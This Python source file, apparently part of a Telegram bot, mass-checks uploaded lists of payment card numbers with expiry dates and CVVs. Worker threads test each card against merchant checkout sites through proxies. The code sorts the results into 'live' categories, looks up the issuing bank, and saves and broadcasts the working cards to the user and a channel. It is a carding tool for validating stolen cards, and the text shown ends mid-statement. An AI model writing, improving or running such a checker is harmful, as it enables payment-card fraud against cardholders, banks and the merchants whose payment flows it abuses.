
import os
import re
import time
import logging
import threading
from telebot import types
from concurrent.futures import ThreadPoolExecutor, as_completed, CancelledError
from html import escape
import shutil
import glob
import json
from datetime import datetime, timezone
from shared_state import (
    is_user_busy,
    set_user_busy,
    clear_user_busy,
    save_live_cc_to_json,
    try_process_with_retries,
)
from site_auth_manager import clone_user_site_files
from config import MAX_WORKERS
# ================================================================
# ⚙️ CONFIG IMPORTS  (Matches your real config.py)
# ================================================================
# ============================================================
# ⚙️ Config Imports
# ============================================================
from config import (
    BOT_TOKEN,
    CHANNEL_ID,
    ADMIN_ID,
    MAX_WORKERS,
    BATCH_SIZE,
    DELAY_BETWEEN_BATCHES,
)
from runtime_config import get_default_site  # ✅ dynamic fallback
DEFAULT_API_URL = get_default_site()

send_lock = threading.Lock()
last_send_time = 0.0


from telebot.apihelper import ApiTelegramException

_dispatcher = None


def set_dispatcher(dispatcher):
    global _dispatcher
    _dispatcher = dispatcher


def safe_send_message(bot, target_id, text, *, delay: float = 0.0, **kwargs):
    """Send Telegram message safely, respecting flood limits."""
    if _dispatcher:
        _dispatcher.enqueue("send_message", target_id, text, delay=delay, **kwargs)
        return
    if delay > 0:
        time.sleep(delay)
    import logging
    while True:
        try:
            bot.send_message(target_id, text, **kwargs)
            break  # success
        except ApiTelegramException as e:
            msg = str(e)
            if "Flood control exceeded" in msg or "Too Many Requests" in msg:
                match = re.search(r"Retry in (\d+)", msg)
                wait = int(match.group(1)) if match else 5
                logging.warning(f"[FLOOD WAIT] Waiting {wait}s before retry...")
                time.sleep(wait + 1)
            else:
                logging.warning(f"[SEND ERROR] {e}")
                break
        except Exception as e:
            logging.warning(f"[SEND ERROR] {e}")
            break


# ================================================================
# 🧩 MODULE IMPORTS
# ================================================================
from site_auth_manager import process_card_for_user_sites, _load_state
from proxy_manager import get_user_proxy     # ✅
from bininfo import round_robin_bin_lookup
from manual_check import country_to_flag

# ================================================================
# 🪶 LOGGING CONFIG
# ================================================================
BASE_DIR = os.path.dirname(__file__)
LOG_FILE = os.path.join(BASE_DIR, "mass_check_debug.log")

logging.basicConfig(
    level=logging.WARNING,  # only show warnings & errors
    format="[%(asctime)s] [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()],  # remove file logging
)

logger = logging.getLogger("mass_check")
logger.info("🧠 MassCheck initialized with advanced stop system (config-synced)")

# ================================================================
# 🧠 GLOBAL STRUCTURES
# ================================================================
user_mass_locks = {}
user_mass_locks_lock = threading.Lock()

user_uploaded_files = {}
user_futures = {}
user_futures_lock = threading.Lock()

progress_lock = threading.Lock()
outfile_lock = threading.Lock()

stop_events = {}
stop_events_lock = threading.Lock()
activechecks = {}  # {user_id: Thread}
activechecks_lock = threading.Lock()

WORKER_CARD_PAUSE = 0.35  # seconds delay between cards per worker (tuned for speed)
LIVE_MESSAGE_GAP_DEFAULT = 1.0   # per-target minimal gap for live notifications (seconds)
LIVE_MESSAGE_GAP_CHANNEL = 1.2   # slightly higher gap when posting to channel broadcasts
STOP_CHECK_INTERVAL = 0.2

DECLINED_UPDATE_GAP = 5

_live_send_lock = threading.Lock()
_live_send_schedule = {}       # target_id -> next allowable send timestamp
_last_live_scheduled = {}      # target_id -> last scheduled send timestamp


def _get_live_gap_for_target(target_id) -> float:
    """Return the delay gap for a given notification target."""
    if str(target_id) == str(CHANNEL_ID):
        return LIVE_MESSAGE_GAP_CHANNEL
    return LIVE_MESSAGE_GAP_DEFAULT


def _cleanup_live_schedule_locked(now: float):
    """
    Remove stale scheduling entries; expects _live_send_lock to be held.
    Keeps dicts small once their scheduled times are far in the past.
    """
    expired_targets = [
        target for target, next_available in list(_live_send_schedule.items())
        if next_available + 2.0 < now
    ]
    for target in expired_targets:
        _live_send_schedule.pop(target, None)
        _last_live_scheduled.pop(target, None)


def is_mass_check_active(chat_id: str) -> bool:
    """Return True if the user currently has an active mass-check thread."""
    with activechecks_lock:
        thread = activechecks.get(chat_id)
        return bool(thread and thread.is_alive())


def _register_active_thread(chat_id: str, thread: threading.Thread) -> bool:
    """
    Track the thread responsible for a user's mass check.
    Returns False if another live thread exists for the same user.
    """
    with activechecks_lock:
        existing = activechecks.get(chat_id)
        if existing and existing is not thread and existing.is_alive():
            return False
        activechecks[chat_id] = thread
        return True


def _clear_active_thread(chat_id: str, thread: threading.Thread | None = None):
    """
    Remove the active thread entry for a user.
    If `thread` is provided, only clear when it matches the stored one.
    """
    with activechecks_lock:
        if thread is None:
            activechecks.pop(chat_id, None)
            return
        current = activechecks.get(chat_id)
        if current is thread:
            activechecks.pop(chat_id, None)


def sleep_with_stop(chat_id: str, seconds: float, check_interval: float = STOP_CHECK_INTERVAL) -> bool:
    """
    Sleep in small intervals while honoring stop requests.
    Returns True if a stop was detected during the wait.
    """
    if seconds <= 0:
        return False
    end_time = time.time() + seconds
    while True:
        if is_stop_requested(chat_id):
            return True
        remaining = end_time - time.time()
        if remaining <= 0:
            return False
        time.sleep(min(check_interval, remaining))


def queue_live_notification(bot, target_id: str, text: str, *, base_delay: float = 0.0, **kwargs) -> float:
    """
    Schedule a live notification through the dispatcher with per-target spacing to avoid flood control.
    Returns the effective delay (seconds) applied before sending.
    """
    target_key = str(target_id)
    target_gap = _get_live_gap_for_target(target_key)
    with _live_send_lock:
        now = time.time()
        next_available = _live_send_schedule.get(target_key, now)
        earliest = max(now, next_available)
        scheduled = earliest + max(base_delay, 0.0)
        effective_delay = max(0.0, scheduled - now)
        _last_live_scheduled[target_key] = scheduled
        _live_send_schedule[target_key] = scheduled + target_gap
        _cleanup_live_schedule_locked(now)
    safe_send_message(
        bot,
        target_id,
        text,
        delay=effective_delay,
        **kwargs,
    )
    return effective_delay


def wait_for_live_queue_flush(pending_live: int = 0, *, buffer: float = 0.4, targets: tuple[str, ...] | None = None):
    """
    Best-effort wait until all queued live notifications finish sending.
    Sleeps until the last scheduled live send time has passed, then blocks on the
    dispatcher (if available) for a short period to let remaining tasks drain.
    """
    if pending_live <= 0:
        return

    with _live_send_lock:
        if targets:
            relevant_times = [
                _last_live_scheduled.get(str(target))
                for target in targets
                if _last_live_scheduled.get(str(target)) is not None
            ]
        else:
            relevant_times = list(_last_live_scheduled.values())

        last_scheduled = max(relevant_times) if relevant_times else None

    if last_scheduled is None:
        return

    remaining = last_scheduled - time.time()
    if remaining > 0:
        sleep_duration = remaining + max(buffer, 0.1)
        logger.debug(
            f"[QUEUE FLUSH] Waiting {sleep_duration:.2f}s for {pending_live} live notifications to finish."
        )
        time.sleep(sleep_duration)

    if _dispatcher:
        extra_timeout = max(5.0, pending_live * 0.35)
        if not _dispatcher.wait_until_idle(timeout=extra_timeout):
            logger.warning(
                f"[QUEUE FLUSH] Dispatcher still busy after waiting {extra_timeout:.1f}s (pending_live={pending_live})."
            )


# ================================================================
# ⚠️ EXCEPTIONS
# ================================================================
class StopMassCheckException(Exception):
    """Raised to immediately abort mass check processing."""
    pass


# ================================================================
# 🧩 STOP SYSTEM
# ================================================================

# Base folder for live CC results
LIVECC_BASE = os.path.join(os.getcwd(), "live-cc")

def ensure_livecc_folder(user_id: str):
    """Ensure that live-cc/<user_id>/ exists and return its path."""
    folder = os.path.join(LIVECC_BASE, str(user_id))
    os.makedirs(folder, exist_ok=True)
    return folder


def save_live_to_worker_file(user_id: str, worker_id: int, card_data: dict):
    """
    Save a single live card result to a worker-specific file:
    live-cc/<user_id>/Live_cc_<user_id>_<worker_id>.json
    """
    folder = ensure_livecc_folder(user_id)
    file_path = os.path.join(folder, f"Live_cc_{user_id}_{worker_id}.json")

    try:
        # Load existing file
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                existing = json.load(f)
        else:
            existing = []

        existing.append(card_data)

        # Write back
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(existing, f, indent=2)

        logging.debug(f"[Worker {worker_id}] Saved live to {file_path}")

    except Exception as e:
        logging.error(f"[Worker {worker_id}] Error saving live: {e}")

def get_stop_event(chat_id: str):
    """Return (or create) a per-user stop event."""
    with stop_events_lock:
        if chat_id not in stop_events:
            stop_events[chat_id] = threading.Event()
        return stop_events[chat_id]


def set_stop_event(chat_id: str):
    """Activate stop event + create stop file for fallback."""
    with stop_events_lock:
        if chat_id not in stop_events:
            stop_events[chat_id] = threading.Event()
        stop_events[chat_id].set()

    stop_path = f"fstop{chat_id}.stop"
    try:
        with open(stop_path, "w") as f:
            f.write("stop")
        logger.info(f"[STOP FILE] Created {stop_path}")
    except Exception as e:
        logger.warning(f"[STOP FILE ERROR] Could not create stop file: {e}")

    logger.info(f"[STOP EVENT] Stop triggered for user {chat_id}")


def clear_stop_event(chat_id: str):
    """Reset stop flags and remove stop file."""
    with stop_events_lock:
        if chat_id in stop_events:
            del stop_events[chat_id]
            logger.info(f"[STOP EVENT] Cleared for {chat_id}")

    stop_path = f"fstop{chat_id}.stop"
    if os.path.exists(stop_path):
        try:
            os.remove(stop_path)
            logger.info(f"[STOP FILE] Removed {stop_path}")
        except Exception:
            pass


def is_stop_requested(chat_id: str):
    """Check both memory and file stop flags. Thread-safe for concurrent users."""
    # ✅ Thread-safe: Read from dictionary with lock protection
    with stop_events_lock:
        ev = stop_events.get(chat_id)
        if ev and ev.is_set():
            return True
    
    # ✅ Fallback: Check file system (atomic operation, no lock needed)
    if os.path.exists(f"fstop{chat_id}.stop"):
        return True
    return False


# ================================================================
# 🧹 CLEANUP HELPERS
# ================================================================
def cleanup_all_raw_files(chat_id: str):
    """
    Completely delete all files related to a specific user ID.
    This includes:
      - raw_results_<chat_id>_*.txt
      - live_ccs_<chat_id>_*.txt
      - any leftover temp or .del files related to this user.
    Fully Windows-safe with multiple unlock & retry strategies.
    """
    patterns = [
        f"raw_results_{chat_id}_*.txt",
        f"live_ccs_{chat_id}_*.txt",
        f"fstop{chat_id}.stop",
        f"sessions\\{chat_id}",  # session folder
    ]
    cwd = os.getcwd()

    # ✅ Close any lingering open file handles
    try:
        for obj in globals().values():
            if hasattr(obj, "close") and callable(obj.close):
                try:
                    obj.close()
                except Exception:
                    pass
    except Exception:
        pass

    deleted_any = False

    for pattern in patterns:
        for path in glob.glob(os.path.join(cwd, pattern)):
            try:
                if os.path.isdir(path):
                    shutil.rmtree(path, ignore_errors=True)
                    logger.info(f"[CLEANUP] Deleted folder for user {chat_id}: {path}")
                    deleted_any = True
                    continue

                # 🧹 Safe multi-step file deletion with retry
                for attempt in range(1):
                    try:
                        # Windows unlock trick — reopen and close to release handles
                        with open(path, "a", encoding="utf-8") as f:
                            f.flush()

                        os.remove(path)
                        logger.info(f"[CLEANUP] Deleted file {os.path.basename(path)} (attempt {attempt+1})")
                        deleted_any = True
                        break
                    except PermissionError:
                        try:
                            tmp_path = path + f".del{attempt}"
                            os.replace(path, tmp_path)
                            os.remove(tmp_path)
                            logger.info(f"[CLEANUP] Renamed and deleted locked file {os.path.basename(path)} (attempt {attempt+1})")
                            deleted_any = True
                            break
                        except Exception:
                            time.sleep(1.0)
                    except FileNotFoundError:
                        break
                    except Exception as e:
                        logger.warning(f"[CLEANUP ERROR] {os.path.basename(path)}: {e}")
                        break
            except Exception as e:
                logger.warning(f"[CLEANUP ERROR] General cleanup failed for {path}: {e}")

    # 🕐 Final delayed safety pass for leftover locks
    def _final_pass():
        for pattern in patterns:
            for path in glob.glob(os.path.join(cwd, pattern)):
                try:
                    if os.path.isdir(path):
                        shutil.rmtree(path, ignore_errors=True)
                    elif os.path.exists(path):
                        os.remove(path)
                        logger.info(f"[FINAL CLEANUP] Deleted leftover file {os.path.basename(path)}")
                except Exception as e:
                    logger.warning(f"[FINAL CLEANUP ERROR] {os.path.basename(path)}: {e}")

    # 🧼 Force garbage collection before final pass
    import gc
    gc.collect()

    # ⏳ Delay cleanup slightly more to allow Telegram & threads to release file locks
    threading.Timer(2.0, _final_pass).start()

    if not deleted_any:
        logger.info(f"[CLEANUP] No leftover files found for user {chat_id}")


    # 🕐 Delay cleanup slightly more to let Telegram & workers finish using files
    threading.Timer(2.0, _final_pass).start()


    if not deleted_any:
        logger.info(f"[CLEANUP] No leftover files found for user {chat_id}")






def cleanup_user_file(chat_id: str):
    """Delete the uploaded .txt file for this user."""
    path = user_uploaded_files.pop(chat_id, None)
    if path and os.path.exists(path):
        try:
            os.remove(path)
            logger.info(f"[CLEANUP] Deleted uploaded file {path} for {chat_id}")
        except Exception as e:
            logger.error(f"[CLEANUP ERROR] Failed to delete uploaded file {path}: {e}")
            
def cleanup_user_json(chat_id):
    """
    Rotate the user's live JSON file when it grows too large (>4 MB).
    Instead of deleting it, rename the existing one to a numbered backup.
    """
    folder = "live-cc"
    os.makedirs(folder, exist_ok=True)
    file_path = os.path.join(folder, f"Live_cc_{chat_id}.json")

    if os.path.exists(file_path):
        try:
            size = os.path.getsize(file_path)
            if size > 4 * 1024 * 1024:  # 4MB rotation threshold
                base, ext = os.path.splitext(file_path)

                # Find next available index (e.g., (2), (3), ...)
                index = 2
                rotated_path = f"{base}({index}){ext}"
                while os.path.exists(rotated_path):
                    index += 1
                    rotated_path = f"{base}({index}){ext}"

                # Rename the large file
                os.rename(file_path, rotated_path)
                logger.info(f"[LIVE JSON ROTATE] {file_path} → {rotated_path}")

                # Create a fresh empty file
                with open(file_path, "w", encoding="utf-8") as f:
                    json.dump([], f, indent=2, ensure_ascii=False)
                logger.info(f"[LIVE JSON ROTATE] Created new empty file {file_path}")

        except Exception as e:
            logger.warning(f"[LIVE JSON ROTATE ERROR] {e}")
            
# ================================================================
# 🧾 PROGRESS BOARD (INLINE KEYBOARD)
# ================================================================
def build_status_keyboard(card, total, processed, status,
                          cvv, ccn, threed, low, declined,
                          checking, chat_id, reason=None):
    """Create an inline keyboard showing progress and stats."""
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(types.InlineKeyboardButton(f"✧ {card} ✧", callback_data="noop"))

    # 🧠 If there's a reason, show it *alone* for cleaner look
    if reason:
        keyboard.add(types.InlineKeyboardButton(f"✧ {reason} ✧", callback_data="noop"))
    else:
        keyboard.add(types.InlineKeyboardButton(f"✧ STATUS → {status} ✧", callback_data="noop"))

    keyboard.add(types.InlineKeyboardButton(f"✧ CVV → [ {cvv} ] ✧", callback_data="noop"))
    keyboard.add(types.InlineKeyboardButton(f"✧ CCN → [ {ccn} ] ✧", callback_data="noop"))
    keyboard.add(types.InlineKeyboardButton(f"✧ 3DS → [ {threed} ] ✧", callback_data="noop"))
    keyboard.add(types.InlineKeyboardButton(f"✧ LOW FUNDS → [ {low} ] ✧", callback_data="noop"))
    keyboard.add(types.InlineKeyboardButton(f"✧ DECLINED → [ {declined} ] ✧", callback_data="noop"))
    keyboard.add(types.InlineKeyboardButton(f"✧ TOTAL ➜ [ {processed}/{total} ] ✧", callback_data="noop"))
    if checking:
        keyboard.add(types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{chat_id}"))
    return keyboard




# ================================================================
# 🧭 THREAD WRAPPER (For main.py)
# ================================================================
def run_mass_check_thread(bot, message, allowed_users=None):
    """Spawn a per-user background thread to run handle_file()."""
    chat_id = str(message.chat.id)

    t = threading.Thread(
        target=handle_file,
        args=(bot, message, allowed_users),
        daemon=True
    )

    if not _register_active_thread(chat_id, t):
        bot.reply_to(message, "⚠ Already running. Please wait for your previous session.")
        return

    t.start()
    logger.info(f"[THREAD] Mass check thread launched for {chat_id}")


# ================================================================
# 📂 MAIN MASS CHECK HANDLER (implementation)
# ================================================================
def _handle_file_impl(bot, message, allowed_users):
    chat_id = str(message.chat.id)

    def _get_active_sites():
        try:
            state = _load_state(chat_id)
            return state.get(str(chat_id), {}).get("sites", {})
        except Exception:
            return {}

    def _has_active_sites():
        return bool(_get_active_sites())

    all_sites_dead_announced = threading.Event()
    all_sites_dead_lock = threading.Lock()

    # --- Step 0: check if user still has active sites ---
    try:
        state = _load_state(chat_id)
        user_sites = state.get(str(chat_id), {}).get("sites", {})
    except Exception as e:
        user_sites = {}
        print(f"[WARN] Could not load sites for {chat_id}: {e}")

    if not user_sites:
        bot.send_message(
            chat_id,
            "⚠️ All your sites are dead or removed. Please add new ones before running mass check again."
        )
        print(f"[ABORT] No active sites found for {chat_id}. Skipping mass check.")
        return

    # ✅ Check access before continuing
    if allowed_users is not None and chat_id not in allowed_users:
        bot.reply_to(message, "🚫 You are not allowed to use this bot.")
        return


    # ✅ Initialize stop event for this user
    stop_event = get_stop_event(chat_id)


    # 🚦 Prevent overlap with manual check or another mass check
    if is_user_busy(chat_id):
        bot.reply_to(message, "⚠ You already have an active check running (manual or mass). Please wait.")
        return

    # 🟢 Mark user as busy
    set_user_busy(chat_id, "mass")

    stop_event.clear()
    clear_stop_event(chat_id)
    cleanup_all_raw_files(chat_id)


    # 🧠 Create per-user lock
    with user_mass_locks_lock:
        if chat_id not in user_mass_locks:
            user_mass_locks[chat_id] = threading.Lock()
        lock = user_mass_locks[chat_id]

    if not lock.acquire(blocking=False):
        bot.reply_to(message, "⚠ Already running. Please wait for your current check to finish.")
        return

    # Download the user’s file
    try:
        doc = message.document
        temp_path = os.path.join(os.getcwd(), doc.file_name)
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        with open(temp_path, "wb") as f:
            f.write(downloaded)
        user_uploaded_files[chat_id] = temp_path
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to download file: {e}")
        lock.release()
        return

    # Parse valid cards
    valid_cards = []
    with open(temp_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            normalized = re.sub(r"\s*\|\s*", "|", line)
            if len(normalized.split("|")) == 4:
                valid_cards.append(normalized)

    if not valid_cards:
        bot.reply_to(message, "❌ No valid cards found in file.")
        cleanup_user_file(chat_id)
        lock.release()
        clear_user_busy(chat_id)
        return

    # Initialize counters
    counters = {
        "cvv": 0, "ccn": 0, "low": 0, "declined": 0,
        "threed": 0, "total_processed": 0,
        "total_cards": len(valid_cards),
    }

    reply_msg = bot.reply_to(
        message,
        f"Processing 0/{len(valid_cards)} cards...",
        reply_markup=build_status_keyboard(
            "Waiting", len(valid_cards), 0, "Idle",
            0, 0, 0, 0, 0, True, chat_id
        )
    )

    # ✅ Auto-pin the progress board message
    try:
        bot.pin_chat_message(chat_id, reply_msg.message_id, disable_notification=True)
        print(f"[DEBUG] Pinned progress board message {reply_msg.message_id} for {chat_id}")
    except Exception as e:
        # Silently fail if pinning is not allowed (e.g., user doesn't have permission)
        print(f"[DEBUG] Could not pin message (may not have permission): {e}")

    # Prepare live results list
    live_cc_results = []
    raw_file = f"raw_results_{chat_id}_{int(time.time())}.txt"

    # Continue with the threaded processing logic below...
    # ============================================================
    # 🧵 THREADED CARD PROCESSING
    # ============================================================
    clone_user_site_files(chat_id, MAX_WORKERS)
    with open(raw_file, "w", encoding="utf-8") as outfile:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:

            # 🧭 Watchdog thread – cancels all workers instantly when STOP is pressed
            def monitor_stop():
                while not is_stop_requested(chat_id):
                    if sleep_with_stop(chat_id, STOP_CHECK_INTERVAL):
                        break
                try:
                    logger.warning(f"[WATCHDOG] Stop detected — shutting down executor for {chat_id}")
                    executor.shutdown(wait=False, cancel_futures=True)
                except Exception as e:
                    logger.error(f"[WATCHDOG ERROR] {e}")

            # start the watchdog in background
            threading.Thread(target=monitor_stop, daemon=True).start()

            futures = []
            with user_futures_lock:
                user_futures[chat_id] = []

            last_board_update = {
                "processed": 0,
                "status": None,
                "reason": None,
                "declined": 0,
                "processed_display": 0,
                "declined_checkpoint": 0,
                "last_non_decline_ts": 0.0,
            }
            milestone_state = {
                "processed": 0,
                "card": None,
            }

            # 🛑 Force cancel any unfinished tasks when stop is pressed
            def cancel_pending_futures():
                with user_futures_lock:
                    if chat_id in user_futures:
                        for fut in user_futures[chat_id]:
                            if not fut.done() and not fut.cancelled():
                                fut.cancel()


            # ----------------------------------------------------
            # DEFINE WORKER FUNCTION
            # ----------------------------------------------------
            def process_one(card, worker_id=None):
                """Worker: process a single card with instant stop checks."""
                if is_stop_requested(chat_id):
                    raise StopMassCheckException()

                start_time = time.time()
                result_site = None
                result = {"status": "DECLINED", "reason": "Unknown error", "_used_proxy": False}

                try:
                    user_proxy = get_user_proxy(chat_id)

                    # --- unified retry + cleanup (shared helper) ---
                    from shared_state import try_process_with_retries
                    from site_auth_manager import _load_state

                    # --- unified retry + cleanup (shared helper) ---
                    result_site, result = try_process_with_retries(
                        card,
                        chat_id,
                        user_proxy=user_proxy,
                        worker_id=worker_id,
                        stop_checker=lambda: is_stop_requested(chat_id),
                    )

                    if isinstance(result, dict) and result.get("status") == "STOPPED":
                        raise StopMassCheckException()

                    # 🧠 After retries: recheck if user has any live sites left
                    try:
                        state = _load_state(chat_id)
                        user_sites = state.get(str(chat_id), {}).get("sites", {})
                    except Exception as e:
                        user_sites = {}
                        print(f"[WARN] Could not recheck user sites for {chat_id}: {e}")

                    if not user_sites:
                        # Only send message once, even if multiple workers detect this condition
                        with all_sites_dead_lock:
                            if not all_sites_dead_announced.is_set():
                                all_sites_dead_announced.set()
                                safe_send_message(
                                    bot,
                                    chat_id,
                                    "⚠️ All your sites have died during checking. Please add new ones.",
                                    parse_mode="HTML"
                                )
                                print(f"[AUTO-STOP] All sites dead for {chat_id}. Stopping checks.")
                        set_stop_event(chat_id)  # optional: if you use stop events to halt threads
                        return  # stop this worker early


                    # 🔄 Normalize message using the same logic as manual check (keep your original handling below)

                    from site_auth_manager import normalize_result
                    if isinstance(result, dict):
                        normalized = normalize_result(result.get("status"), result.get("reason", ""))
                        result.update({
                            "status": normalized["status"],
                            "top_status": normalized["top_status"],
                            "display_status": normalized["display_status"],
                            "message": normalized["message"],
                            "emoji": normalized["emoji"],
                        })
                                        

                    # ✅ Ensure proxy flag always exists for message display
                    if isinstance(result, dict):
                        if "_used_proxy" not in result:
                            result["_used_proxy"] = bool(user_proxy)
                                        
                    if not isinstance(result, dict):
                        result = {"status": "DECLINED", "reason": "Invalid result"}
                except Exception as e:
                    logger.error(f"[MassCheck] Error processing {card}: {e}")
                    result = {"status": "DECLINED", "reason": str(e)}

                if is_stop_requested(chat_id):
                    raise StopMassCheckException()

                elapsed = time.time() - start_time
                finished_at = datetime.now(timezone.utc)
                logger.info(f"[MassCheck] {card[:6]}**** processed in {elapsed:.2f}s → {result.get('status')}")
                if sleep_with_stop(chat_id, WORKER_CARD_PAUSE):
                    raise StopMassCheckException()
                return (card, result_site, result, elapsed, finished_at)

            # ----------------------------------------------------
            # QUEUE ALL CARDS
            # ----------------------------------------------------
            for idx, card in enumerate(valid_cards):
                if is_stop_requested(chat_id):
                    break
                worker_id = (idx % MAX_WORKERS) + 1
                future = executor.submit(process_one, card, worker_id)
                futures.append(future)
                with user_futures_lock:
                    user_futures[chat_id].append(future)




            # ----------------------------------------------------
            # PROCESS RESULTS AS THEY COMPLETE
            # ----------------------------------------------------
            try:
                for idx, future in enumerate(as_completed(futures), start=1):
                    if is_stop_requested(chat_id):
                        break

                    try:
                        if future.cancelled():
                            continue
                        card_result = future.result()
                        if not card_result:
                            continue

                        card, result_site, result, elapsed, finished_at = card_result
                        termination_message = "All your sites have died during checking. Please add new ones."

                        if not all_sites_dead_announced.is_set():
                            no_sites_left = not _has_active_sites()
                            result_reason = ""
                            if isinstance(result, dict):
                                result_reason = (result.get("reason") or "").strip()

                            if no_sites_left or result_reason == termination_message:
                                all_sites_dead_announced.set()
                                safe_send_message(
                                    bot,
                                    chat_id,
                                    termination_message,
                                    parse_mode="HTML"
                                )
                                cancel_pending_futures()
                                set_stop_event(chat_id)
                                break
                        status = result.get("status", "DECLINED")
                        message_text = result.get("message", result.get("reason", "Unknown response."))
                        checked_at_text = finished_at.strftime("%Y-%m-%d %H:%M:%S UTC")

                        # 🧩 Clarify declined reasons for mass check inline board
                        if status.upper() == "DECLINED":
                            reason_lower = message_text.lower()
                            if "stripe" in reason_lower:
                                message_text = "DECLINED (Stripe Token Error)"
                            elif "site" in reason_lower:
                                message_text = "DECLINED (Site Response Failed)"
                            elif "timeout" in reason_lower or "connection" in reason_lower:
                                message_text = "DECLINED (Connection Timeout)"

                        # refine declined reason
                        if status == "DECLINED":
                            reason_lower = message_text.lower()
                            if "stripe" in reason_lower:
                                message_text = "Declined (Stripe Token Error)"
                            elif "site" in reason_lower:
                                message_text = "Declined (Site Response Failed)"
                        # 🧹 Clean duplicate decline phrases like "Card declined (your card was declined)"
                        message_text = re.sub(
                            r"\bcard declined\s*\(.*your card was declined.*\)",
                            "Your card was declined",
                            message_text,
                            flags=re.I
                        ).strip()

                        # 🔎 Simplify redundant nested parentheses or doubled messages
                        if "your card was declined" in message_text.lower() and "(" in message_text:
                            message_text = "Your card was declined."

                        # -----------------------------------------
                        # 💳 CLASSIFY RESULT TYPE
                        # -----------------------------------------
                        if message_text == "CARD ADDED":
                            message_text = "Auth access🔥"

                        emoji_map = {
                            "CCN": "🔥",
                            "APPROVED": "✅",
                            "DECLINED": " ",
                            "PAYMENT_ADDED": "✅",
                            "CARD ADDED": "✅",
                            "INSUFFICIENT_FUNDS": "⚠️",
                            "CVV": "⚠️",
                            "3DS_REQUIRED": "⚠️"
                        }
                        emoji = emoji_map.get(status, "❔")
                        top_status = "DECLINED"
                        count_as = "declined"
                        send_message = False

                        msg_lower = message_text.lower()

                        if any(x in msg_lower for x in ["card number is incorrect", "your card is incorrect", "incorrect number"]):
                            top_status, count_as, send_message = "Declined ❌", "declined", False

                        elif any(x in msg_lower for x in ["does not support", "unsupported", "not supported"]):
                            top_status, count_as, send_message = "Approved ✅", "cvv", True
                            status = "APPROVED"
                            emoji = "✅"

                        elif any(x in msg_lower for x in ["requires_action", "3ds", "authentication required"]):
                            top_status, count_as, send_message = "3DS", "threed", True

                        elif any(x in msg_lower for x in ["insufficient", "low balance", "not enough funds"]):
                            top_status, count_as, send_message = "LOW FUNDS", "low", True
                            message_text = "Your card has insufficient funds."

                        elif any(x in msg_lower for x in [
                            "security", "cvc", "cvv", "invalid cvc", "incorrect cvc",
                            "security code incorrect", "your card security", "card security incorrect"
                        ]):
                            top_status, count_as, send_message = "CCN ✅", "ccn", True
                            message_text = "Your card security is incorrect."

                        elif any(x in msg_lower for x in ["expired", "expiration", "invalid expiry"]):
                            top_status, count_as, send_message = "Declined ❌", "declined", False

                        elif status in ("PAYMENT_ADDED", "CARD ADDED"):
                            top_status, count_as, send_message = "Approved ✅", "cvv", True

                        else:
                            top_status, count_as, send_message = "Declined ❌", "declined", False


                        # ✅ Save to per-worker JSON when card is LIVE
                        if send_message and top_status.startswith(("Approved", "CCN", "Insufficient", "3DS")):
                            live_entry = {
                                "cc": card,
                                "status": top_status,
                                "site": result_site,
                                "scheme": result.get("scheme", ""),
                                "type": result.get("type", ""),
                                "brand": result.get("brand", ""),
                                "bank": result.get("bank", ""),
                                "country": result.get("country", ""),
                                "proxy": result.get("_used_proxy", False),
                                "message": message_text,
                                "checked_at": checked_at_text,
                            }
                            save_live_cc_to_json(chat_id, worker_id, live_entry)

                        # -----------------------------------------
                        # 💬 BUILD RESULT MESSAGE (user output)
                        # -----------------------------------------
                        if send_message:
                            try:
                                proxy_state = "Live ✅" if result.get("_used_proxy") else "None"
                                try:
                                    bin_info = round_robin_bin_lookup(card.split("|")[0])
                                    scheme = bin_info.get("scheme", "Unknown")
                                    ctype = bin_info.get("type", "Unknown")
                                    brand = bin_info.get("brand", "Unknown")
                                    bank = bin_info.get("bank", "Unknown Bank")
                                    country = bin_info.get("country", "Unknown Country")
                                except Exception:
                                    scheme = ctype = brand = bank = country = "Unknown"

                                # Chat name
                                try:
                                    user = bot.get_chat(chat_id)
                                    username_display = (
                                        user.first_name or user.last_name or f"@{user.username}" or f"User {chat_id}"
                                    )
                                except Exception:
                                    username_display = f"User {chat_id}"

                                # Site index (for multi-site)
                                # Site index (for multi-site)
                                try:
                                    from runtime_config import get_default_site  # ✅ fetch fresh default each time
                                    default_site = get_default_site()

                                    state = _load_state(chat_id)
                                    user_sites = list(state.get(str(chat_id), {}).get("sites", {}).keys()) or [default_site]
                                    site_num = user_sites.index(result_site) + 1 if result_site in user_sites else None

                                    if len(user_sites) <= 1:
                                        site_num = None
                                except Exception:
                                    site_num = None

                                if status == "CARD ADDED":
                                    status = "Card Added"
                                # Build detailed message
                                status_display = f"{status}{emoji}".rstrip()
                                if status == "3DS_REQUIRED":
                                    status_display = "⚠️ Requires Action"
                                elif status == "INSUFFICIENT_FUNDS":
                                    status_display = "⚠️ Insufficient Funds"
                                detail_msg = (
                                    f"<b>{top_status}</b>\n"
                                    f"━━━━━━━━━━━━━━━━━━\n"
                                    f"<code>✧ <b>Card:</b></code> <code>{card}</code>\n"
                                    f"<code>✧ <b>Status:</b> {status_display}</code>\n"
                                    f"<code>✧ <b>Message:</b> {message_text}</code>\n"
                                    f"<code>✧ <b>Type:</b> {scheme} | {ctype} | {brand}</code>\n"
                                    f"<code>✧ <b>Bank:</b> {escape(bank)}</code>\n"
                                    f"<code>✧ <b>Country:</b> {escape(country)} {country_to_flag(country)}</code>\n"
                                    f"<code>✧ <b>Proxy:</b> {proxy_state}</code>"
                                    f"{f' <code>[{site_num}]</code>' if site_num else ''}\n"
                                    f"<code>✧ <b>Checked by:</b></code><code>{escape(username_display)}</code> <code>[</code><code>{chat_id}</code><code>]</code>\n"
                                    f"<code>✧ <b>Duration:</b> {elapsed:.2f}s ⏳</code>\n"
                                    f"━━━━━━━━━━━━━━━━━━\n"
                                )

                                # Save & send live message
                                if sleep_with_stop(chat_id, 0.05):
                                    raise StopMassCheckException()

                                with outfile_lock:
                                    live_cc_results.append({
                                        "cc": card,
                                        "status": top_status,
                                        "scheme": scheme,
                                        "type": ctype,
                                        "brand": brand,
                                        "bank": bank,
